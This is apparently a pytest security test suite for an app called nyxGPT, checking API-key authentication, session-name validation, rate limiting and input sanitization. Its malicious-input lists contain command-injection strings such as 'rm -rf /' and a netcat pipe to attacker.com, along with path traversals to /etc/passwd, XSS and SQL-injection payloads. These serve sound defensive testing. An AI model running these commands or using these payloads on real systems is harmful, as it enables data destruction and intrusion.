"""Comprehensive security test suite for nyxGPT.

Tests security mechanisms including:
- Authentication bypass attempts
- Session name injection attempts
- API key validation
- Rate limiting behavior
- Input sanitization
"""
from __future__ import annotations

import pytest
import secrets
import time
from unittest.mock import Mock, patch
from fastapi.testclient import TestClient
from configparser import ConfigParser

from nyxgpt.app import app
from nyxgpt.sessions import validate_session_name, sanitize_title_for_filename
from nyxgpt.rate_limiter import RateLimiter

pytestmark = pytest.mark.unit


# ===========================
# Authentication Bypass Tests
# ===========================


def test_authentication_bypass_missing_api_key():
    """Attempt to access protected endpoint without API key should fail."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "secret-key-123",
            "header": "X-API-Key",
        }

        client = TestClient(app)
        response = client.get("/api/v1/info")

        assert response.status_code == 401
        assert response.json()["error"]["code"] == "unauthorized"
        assert "Invalid or missing API key" in response.json()["error"]["message"]


def test_authentication_bypass_wrong_api_key():
    """Attempt to access protected endpoint with incorrect API key should fail."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "correct-key-123",
            "header": "X-API-Key",
        }

        client = TestClient(app)
        response = client.get(
            "/api/v1/info",
            headers={"X-API-Key": "wrong-key-456"}
        )

        assert response.status_code == 401
        assert response.json()["error"]["code"] == "unauthorized"


def test_authentication_bypass_empty_api_key():
    """Attempt to access protected endpoint with empty API key should fail."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "secret-key-123",
            "header": "X-API-Key",
        }

        client = TestClient(app)
        response = client.get(
            "/api/v1/info",
            headers={"X-API-Key": ""}
        )

        assert response.status_code == 401
        assert response.json()["error"]["code"] == "unauthorized"


def test_authentication_bypass_case_sensitive():
    """API key validation should be case-sensitive."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "SecretKey123",
            "header": "X-API-Key",
        }

        client = TestClient(app)
        # Try lowercase version
        response = client.get(
            "/api/v1/info",
            headers={"X-API-Key": "secretkey123"}
        )

        assert response.status_code == 401
        assert response.json()["error"]["code"] == "unauthorized"


def test_authentication_bypass_timing_attack_protection():
    """API key comparison should use constant-time comparison to prevent timing attacks."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        correct_key = "a" * 64  # Long key
        mock_auth.return_value = {
            "enabled": True,
            "api_key": correct_key,
            "header": "X-API-Key",
        }

        client = TestClient(app)

        # Test with keys that differ at different positions
        # A timing attack would reveal position of first wrong character
        wrong_keys = [
            "x" + "a" * 63,  # Differs at position 0
            "a" * 32 + "x" + "a" * 31,  # Differs at middle
            "a" * 63 + "x",  # Differs at end
        ]

        times = []
        for wrong_key in wrong_keys:
            start = time.time()
            response = client.get(
                "/api/v1/info",
                headers={"X-API-Key": wrong_key}
            )
            elapsed = time.time() - start
            times.append(elapsed)
            assert response.status_code == 401

        # All comparisons should take roughly the same time
        # Allow for some variance due to system noise
        max_time = max(times)
        min_time = min(times)
        # Timing difference should be minimal (less than 10x difference)
        # This ensures constant-time comparison is working
        assert max_time < min_time * 10


def test_authentication_health_endpoint_bypasses_auth():
    """Health endpoint should be accessible without authentication."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "secret-key-123",
            "header": "X-API-Key",
        }

        client = TestClient(app)
        response = client.get("/health")

        # Should succeed without API key
        assert response.status_code == 200
        assert response.json() == {"status": "ok"}


def test_authentication_docs_endpoint_bypasses_auth():
    """Documentation endpoints should be accessible without authentication."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "secret-key-123",
            "header": "X-API-Key",
        }

        client = TestClient(app)

        # These should all succeed without API key
        docs_response = client.get("/docs")
        openapi_response = client.get("/openapi.json")

        assert docs_response.status_code == 200
        assert openapi_response.status_code == 200


# ===============================
# Session Name Injection Tests
# ===============================


def test_session_name_path_traversal_attack():
    """Session names with path traversal attempts should be rejected."""
    malicious_names = [
        "../etc/passwd",
        "../../sensitive",
        "../../../root",
        "./../admin",
        "..\\..\\windows",
        "session/../../../etc",
    ]

    for name in malicious_names:
        with pytest.raises(ValueError, match="must be 1-64 alphanumeric"):
            validate_session_name(name)


def test_session_name_absolute_path_attack():
    """Session names with absolute paths should be rejected."""
    malicious_names = [
        "/etc/passwd",
        "/root/secret",
        "C:\\Windows\\System32",
        "/var/log/auth.log",
    ]

    for name in malicious_names:
        with pytest.raises(ValueError, match="must be 1-64 alphanumeric"):
            validate_session_name(name)


def test_session_name_special_characters_injection():
    """Session names with special characters should be rejected."""
    malicious_names = [
        "session; rm -rf /",
        "session && cat /etc/passwd",
        "session | nc attacker.com 1234",
        "session`whoami`",
        "session$(cat /etc/passwd)",
        "session\x00null",
        "session\nnewline",
        "session\ttab",
    ]

    for name in malicious_names:
        with pytest.raises(ValueError, match="must be 1-64 alphanumeric"):
            validate_session_name(name)


def test_session_name_length_limits():
    """Session names should be limited to 64 characters."""
    # Valid: 64 characters
    valid_name = "a" * 64
    assert validate_session_name(valid_name) == valid_name

    # Invalid: 65 characters
    invalid_name = "a" * 65
    with pytest.raises(ValueError, match="must be 1-64 alphanumeric"):
        validate_session_name(invalid_name)

    # Invalid: Empty
    with pytest.raises(ValueError, match="cannot be empty"):
        validate_session_name("")

    # Invalid: Whitespace only
    with pytest.raises(ValueError, match="cannot be empty"):
        validate_session_name("   ")


def test_session_name_valid_characters():
    """Session names should only allow alphanumeric, hyphens, and underscores."""
    valid_names = [
        "session-name",
        "session_name",
        "SessionName",
        "session123",
        "my-chat_session-42",
        "a",
        "A",
        "1",
    ]

    for name in valid_names:
        assert validate_session_name(name) == name


def test_session_name_unicode_injection():
    """Session names with Unicode characters should be rejected."""
    malicious_names = [
        "session名前",
        "session🔥",
        "sessionÄÖÜ",
        "session\u202e",  # Right-to-left override
        "session\ufeff",  # Zero-width no-break space
    ]

    for name in malicious_names:
        with pytest.raises(ValueError, match="must be 1-64 alphanumeric"):
            validate_session_name(name)


def test_sanitize_title_removes_dangerous_characters():
    """Title sanitization should remove potentially dangerous characters."""
    dangerous_titles = [
        ("My Session; rm -rf /", "my-session-rm-rf"),
        ("../../../etc/passwd", "etc-passwd"),
        ("Session\x00Null", "sessionnull"),
        ("Session\nNewline", "session-newline"),
        ("Session | nc attack", "session-nc-attack"),
    ]

    for dangerous, expected_safe in dangerous_titles:
        safe = sanitize_title_for_filename(dangerous)
        # Should not contain dangerous characters
        assert "/" not in safe
        assert "\\" not in safe
        assert ";" not in safe
        assert "|" not in safe
        assert "\x00" not in safe
        assert "\n" not in safe


# ==========================
# API Key Validation Tests
# ==========================


def test_api_key_validation_constant_time_comparison():
    """API key comparison should use secrets.compare_digest for timing attack protection."""
    # This is tested indirectly through the authentication bypass tests
    # but we can also verify the secrets module is used
    key1 = "secret123"
    key2 = "secret124"

    # secrets.compare_digest should return False for different keys
    assert not secrets.compare_digest(key1, key2)

    # Should return True for identical keys
    assert secrets.compare_digest(key1, key1)


def test_api_key_validation_with_correct_key():
    """Valid API key should grant access to protected endpoints."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "correct-key-123",
            "header": "X-API-Key",
        }

        client = TestClient(app)
        response = client.get(
            "/api/v1/info",
            headers={"X-API-Key": "correct-key-123"}
        )

        # Should succeed with correct key
        assert response.status_code == 200


def test_api_key_validation_disabled():
    """When auth is disabled, all requests should succeed."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": False,
            "api_key": "some-key",
            "header": "X-API-Key",
        }

        client = TestClient(app)
        # Should succeed even without API key
        response = client.get("/api/v1/info")

        assert response.status_code == 200


def test_api_key_validation_custom_header():
    """Custom API key header should be respected."""
    with patch("nyxgpt.app._auth_cfg") as mock_auth:
        mock_auth.return_value = {
            "enabled": True,
            "api_key": "secret-key-123",
            "header": "X-Custom-Auth",
        }

        client = TestClient(app)

        # Wrong header should fail
        response = client.get(
            "/api/v1/info",
            headers={"X-API-Key": "secret-key-123"}
        )
        assert response.status_code == 401

        # Correct custom header should succeed
        response = client.get(
            "/api/v1/info",
            headers={"X-Custom-Auth": "secret-key-123"}
        )
        assert response.status_code == 200


# ==========================
# Rate Limiting Tests
# ==========================


def test_rate_limiting_blocks_excessive_requests():
    """Rate limiter should block requests exceeding the limit."""
    limiter = RateLimiter(requests_per_second=1, burst_size=2)

    # First 2 requests should succeed (burst)
    allowed1, _ = limiter.is_allowed("attacker")
    allowed2, _ = limiter.is_allowed("attacker")
    assert allowed1
    assert allowed2

    # Third request should be blocked
    allowed3, headers = limiter.is_allowed("attacker")
    assert not allowed3
    assert headers["X-RateLimit-Remaining"] == "0"


def test_rate_limiting_per_client_isolation():
    """Different clients should have independent rate limits."""
    limiter = RateLimiter(requests_per_second=1, burst_size=1)

    # Exhaust client1's limit
    limiter.is_allowed("client1")
    allowed1, _ = limiter.is_allowed("client1")
    assert not allowed1

    # client2 should still have tokens
    allowed2, _ = limiter.is_allowed("client2")
    assert allowed2


def test_rate_limiting_headers_present():
    """Rate limit headers should be present in responses."""
    limiter = RateLimiter(requests_per_second=10, burst_size=20)

    allowed, headers = limiter.is_allowed("client1")
    assert allowed

    # Required headers
    assert "X-RateLimit-Limit" in headers
    assert "X-RateLimit-Remaining" in headers
    assert "X-RateLimit-Reset" in headers

    # Values should be valid
    assert int(headers["X-RateLimit-Limit"]) == 20
    assert 0 <= int(headers["X-RateLimit-Remaining"]) <= 20


def test_rate_limiting_token_refill():
    """Rate limiter should refill tokens over time."""
    limiter = RateLimiter(requests_per_second=10, burst_size=2)

    # Exhaust tokens
    limiter.is_allowed("client1")
    limiter.is_allowed("client1")

    # Should be blocked now
    allowed, _ = limiter.is_allowed("client1")
    assert not allowed

    # Wait for refill (0.2 seconds = 2 tokens at 10 req/sec)
    time.sleep(0.2)

    # Should be allowed again
    allowed, _ = limiter.is_allowed("client1")
    assert allowed


def test_rate_limiting_ip_extraction():
    """Rate limiter should correctly extract client IP."""
    limiter = RateLimiter(requests_per_second=10, burst_size=20)

    # Test direct connection
    request = Mock()
    request.headers = {}
    request.client = Mock(host="192.168.1.100")

    ip = limiter.get_client_ip(request)
    assert ip == "192.168.1.100"

    # Test X-Forwarded-For header
    request.headers = {"x-forwarded-for": "203.0.113.195, 192.168.1.1"}
    ip = limiter.get_client_ip(request)
    assert ip == "203.0.113.195"  # Should use leftmost IP

    # Test missing client info
    request.client = None
    request.headers = {}
    ip = limiter.get_client_ip(request)
    assert ip == "unknown"


def test_rate_limiting_burst_cap():
    """Token refill should not exceed burst_size."""
    limiter = RateLimiter(requests_per_second=100, burst_size=10)

    # Make one request to create bucket
    limiter.is_allowed("client1")

    # Wait longer than needed to refill burst_size
    time.sleep(0.2)  # Would refill 20 tokens, but capped at 10

    # Should have at most burst_size tokens
    bucket = limiter._clients["client1"]
    with bucket.lock:
        # Manually check tokens don't exceed burst_size
        assert bucket.tokens <= limiter._burst_size


# ============================
# Input Sanitization Tests
# ============================


def test_input_sanitization_request_body_size_limit():
    """Large request bodies should be rejected."""
    client = TestClient(app)

    # Create a large payload (over 1 MiB default limit)
    large_payload = {"data": "x" * (2 * 1024 * 1024)}  # 2 MiB

    response = client.post(
        "/api/v1/chat",
        json=large_payload,
        headers={"Content-Length": str(len(str(large_payload)))}
    )

    # Should be rejected with 413 Payload Too Large
    assert response.status_code == 413
    assert response.json()["error"]["code"] == "payload_too_large"


def test_input_sanitization_session_name_in_url():
    """Session names in URLs should be validated."""
    # Note: Session name validation happens at the function level
    # and raises ValueError before reaching the endpoint handler
    # This test verifies the validation function itself

    malicious_session_names = [
        "../../../etc/passwd",
        "/etc/passwd",
        "session;rm-rf",
        "session\x00null",
    ]

    for malicious_name in malicious_session_names:
        # Session name validation should reject these
        with pytest.raises(ValueError, match="must be 1-64 alphanumeric"):
            validate_session_name(malicious_name)


def test_input_sanitization_xss_prevention():
    """HTML/script injection in session titles should be sanitized."""
    malicious_titles = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src='evil.com'>",
    ]

    for malicious_title in malicious_titles:
        safe = sanitize_title_for_filename(malicious_title)

        # Should not contain HTML tags or JavaScript execution code
        assert "<" not in safe
        assert ">" not in safe
        assert "javascript:" not in safe
        # After sanitization, these should be converted to safe filenames
        # The word "script" may remain if HTML tags are removed,
        # but the dangerous context is eliminated


def test_input_sanitization_sql_injection_prevention():
    """SQL injection patterns should be handled safely."""
    # Note: nyxGPT uses file-based storage, not SQL
    # But we should still sanitize these patterns
    sql_injection_attempts = [
        "'; DROP TABLE sessions; --",
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT * FROM users --",
    ]

    for injection_attempt in sql_injection_attempts:
        safe = sanitize_title_for_filename(injection_attempt)

        # Should not contain SQL keywords or special chars
        assert "'" not in safe
        assert ";" not in safe
        assert "--" not in safe


def test_input_sanitization_null_byte_injection():
    """Null bytes should be removed from input."""
    names_with_null_bytes = [
        "session\x00.txt",
        "session\x00\x00",
        "\x00session",
    ]

    for name in names_with_null_bytes:
        # Should either be rejected or sanitized
        with pytest.raises(ValueError):
            validate_session_name(name)


def test_input_sanitization_whitespace_normalization():
    """Leading/trailing whitespace should be stripped."""
    names_with_whitespace = [
        "  session  ",
        "\tsession\t",
        "\nsession\n",
        "  session",
        "session  ",
    ]

    for name in names_with_whitespace:
        # Should either strip whitespace or reject
        result = validate_session_name(name)
        assert result.strip() == result
        assert result == "session"


# =========================
# Additional Security Tests
# =========================


def test_security_request_id_validation():
    """Request IDs should be validated and not exploitable."""
    client = TestClient(app)

    # Try injection in request ID
    malicious_ids = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE logs; --",
        "../../../etc/passwd",
    ]

    for malicious_id in malicious_ids:
        response = client.get(
            "/health",
            headers={"X-Request-Id": malicious_id}
        )

        # Should succeed (request ID is just logged, not executed)
        assert response.status_code == 200
        # Response should echo back the request ID
        # But it should be in headers, not causing execution
        assert "X-Request-Id" in response.headers


def test_security_cors_restrictions():
    """CORS should restrict origins appropriately."""
    client = TestClient(app)

    # Request from unauthorized origin
    response = client.get(
        "/api/v1/info",
        headers={"Origin": "https://evil.com"}
    )

    # Request should succeed (CORS is enforced by browser, not server)
    # But CORS headers should not allow the evil origin
    if "access-control-allow-origin" in response.headers:
        allowed_origin = response.headers["access-control-allow-origin"]
        # Should not be evil.com or *
        assert allowed_origin != "https://evil.com"
        assert allowed_origin != "*"


def test_security_file_upload_validation():
    """File uploads should validate file types and sizes."""
    client = TestClient(app)

    # This test would require mocking RAG upload endpoint
    # For now, we document the requirement
    # TODO: Add file upload validation tests when RAG is available in test env
    pass


def test_security_error_messages_no_information_leakage():
    """Error messages should not leak sensitive information."""
    client = TestClient(app)

    # Try to access non-existent session
    response = client.get("/api/v1/sessions/nonexistent-session-xyz")

    assert response.status_code == 404
    error = response.json()["error"]

    # Error message should be generic, not revealing file paths or internal details
    assert "error" in response.json()
    assert "message" in error
    # Should not contain absolute paths or internal details
    message = error["message"]
    assert "/home/" not in message
    assert "/.nyxGPT/" not in message
